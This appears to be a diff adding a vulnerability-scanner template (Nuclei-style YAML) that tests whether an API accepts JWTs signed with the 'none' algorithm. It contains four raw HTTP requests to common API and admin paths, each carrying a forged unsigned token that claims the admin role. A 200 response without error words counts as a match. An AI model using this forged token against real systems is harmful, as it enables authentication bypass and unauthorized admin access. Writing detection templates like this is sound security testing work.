@@ -1,0 +1,50 @@
+id: jwt-none-algorithm
+info:
+  name: JWT None Algorithm Vulnerability
+  author: rengine-custom
+  severity: high
+  description: |
+    Detects JWT tokens that accept the 'none' algorithm, which effectively disables
+    signature verification allowing arbitrary token manipulation.
+  tags: custom,jwt,auth,token,vulnerability
+  reference:
+    - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+    - https://portswigger.net/web-security/jwt/
+
+http:
+  - raw:
+      - |
+        GET /api/v1/profile HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
+
+      - |
+        GET /api/v1/users HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
+
+      - |
+        GET /api/me HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
+
+      - |
+        GET /api/admin HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "401"
+          - "Unauthorized"
+          - "Invalid token"
+          - "403"
+        part: body
+        condition: or
+        negative: true
